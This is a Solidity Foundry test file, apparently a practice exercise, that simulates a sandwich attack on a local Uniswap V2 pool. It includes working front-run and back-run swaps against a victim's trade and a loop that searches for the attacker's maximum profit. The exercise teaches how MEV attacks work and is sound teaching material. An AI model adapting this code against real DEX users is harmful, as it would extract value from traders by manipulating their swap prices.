// SPDX-License-Identifier: MIT
pragma solidity 0.8.17;

import "forge-std/Test.sol";
import {SandwichSetUp} from "./helper/SandwichSetUp.sol";

contract SandwichPracticeTest is SandwichSetUp {
    address public maker = makeAddr("Maker");
    address public victim = makeAddr("Victim");
    address public attacker = makeAddr("Attacker");
    uint256 public victimUsdcAmountOutMin;
    uint256 makerInitialEthBalance;
    uint256 makerInitialUsdcBalance;
    uint256 attackerInitialEthBalance;
    uint256 victimInitialEthBalance;

    function setUp() public override {
        super.setUp();

        makerInitialEthBalance = 100 ether;
        makerInitialUsdcBalance = 10_000 * 10 ** usdc.decimals();
        attackerInitialEthBalance = 5 ether;
        victimInitialEthBalance = 1 ether;

        // mint 100 ETH, 10000 USDC to maker
        vm.deal(maker, makerInitialEthBalance);
        usdc.mint(maker, makerInitialUsdcBalance);

        // mint 100 ETH to attacker
        vm.deal(attacker, attackerInitialEthBalance);

        // mint 1 ETH to victim
        vm.deal(victim, victimInitialEthBalance);

        // maker provide 100 ETH, 10000 USDC to wethUsdcPool
        vm.startPrank(maker);
        usdc.approve(address(uniswapV2Router), makerInitialUsdcBalance);
        uniswapV2Router.addLiquidityETH{value: makerInitialEthBalance}(
            address(usdc), makerInitialUsdcBalance, 0, 0, maker, block.timestamp
        );
        vm.stopPrank();
    }

    modifier attackerModifier() {
        _attackerAction1();
        _;
        _attackerAction2();
        _checkAttackerProfit();
    }

    // Do not modify this test function
    // function test_sandwich_attack_with_profit() public attackerModifier {
    //     // victim swap 1 ETH to USDC with usdcAmountOutMin
    //     vm.startPrank(victim);
    //     address[] memory path = new address[](2);
    //     path[0] = address(weth);
    //     path[1] = address(usdc);

    //     // # Discussion 1: how to get victim tx detail info ?
    //     // without attacker action, original usdc amount out is 98715803, use 5% slippage
    //     // originalUsdcAmountOutMin = 93780012;
    //     uint256 originalUsdcAmountOut = 98715803;
    //     uint256 originalUsdcAmountOutMin = (originalUsdcAmountOut * 95) / 100;

    //     uniswapV2Router.swapExactETHForTokens{value: 1 ether}(originalUsdcAmountOutMin, path, victim, block.timestamp);
    //     vm.stopPrank();

    //     // check victim usdc balance >= originalUsdcAmountOutMin (93780012)
    //     assertGe(usdc.balanceOf(victim), originalUsdcAmountOutMin);
    // }

    function test(uint256 i) internal returns (uint256) {
        vm.startPrank(attacker);
        address[] memory path1 = new address[](2);
        path1[0] = address(weth);
        path1[1] = address(usdc);
        uniswapV2Router.swapExactETHForTokens{value: i}(0, path1, attacker, block.timestamp);
        vm.stopPrank();

        vm.startPrank(victim);

        // # Discussion 1: how to get victim tx detail info ?
        // without attacker action, original usdc amount out is 98715803, use 5% slippage
        // originalUsdcAmountOutMin = 93780012;
        uint256 originalUsdcAmountOut = 98715803;
        uint256 originalUsdcAmountOutMin = (originalUsdcAmountOut * 95) / 100;

        uniswapV2Router.swapExactETHForTokens{value: 1 ether}(originalUsdcAmountOutMin, path1, victim, block.timestamp);
        vm.stopPrank();

        vm.startPrank(attacker);
        usdc.approve(address(uniswapV2Router), usdc.balanceOf(attacker));
        address[] memory path2 = new address[](2);
        path2[0] = address(usdc);
        path2[1] = address(weth);
        uniswapV2Router.swapExactTokensForETH(usdc.balanceOf(attacker), 0, path2, attacker, block.timestamp);
        vm.stopPrank();

        return attacker.balance - attackerInitialEthBalance;
    }

    error CustomErrorName(uint256 maxProfit);

    function test_max_profit() public {
        uint256 currentProfit = 0;
        uint256 maxProfit = 0;
        uint256 i = 2 ether;
        do {
            i -= 1000 wei;
            currentProfit = test(i);
            if (currentProfit >= maxProfit) {
                maxProfit = currentProfit;
            } else {
                console.log("max profit: %s", maxProfit);
                revert CustomErrorName(maxProfit);
            }
        } while (true);
    }

    // # Practice 1: attacker sandwich attack
    function _attackerAction1() internal {
        // victim swap ETH to USDC (front-run victim)
        // implement here
        vm.startPrank(attacker);
        address[] memory path = new address[](2);
        path[0] = address(weth);
        path[1] = address(usdc);
        uniswapV2Router.swapExactETHForTokens{value: 0.6 ether}(0, path, attacker, block.timestamp);
        vm.stopPrank();
    }

    // # Practice 2: attacker sandwich attack
    function _attackerAction2() internal {
        // victim swap USDC to ETH
        // implement here
        vm.startPrank(attacker);
        uint256 attackerUsdcBalance = usdc.balanceOf(attacker);
        usdc.approve(address(uniswapV2Router), attackerUsdcBalance);
        address[] memory path = new address[](2);
        path[0] = address(usdc);
        path[1] = address(weth);
        uniswapV2Router.swapExactTokensForETH(attackerUsdcBalance, 0, path, attacker, block.timestamp);
        vm.stopPrank();
    }

    // # Discussion 2: how to maximize profit ?
    function _checkAttackerProfit() internal {
        uint256 profit = attacker.balance - attackerInitialEthBalance;
        console.log("attacker profit: %s", profit);
        assertGt(profit, 0);
    }
}
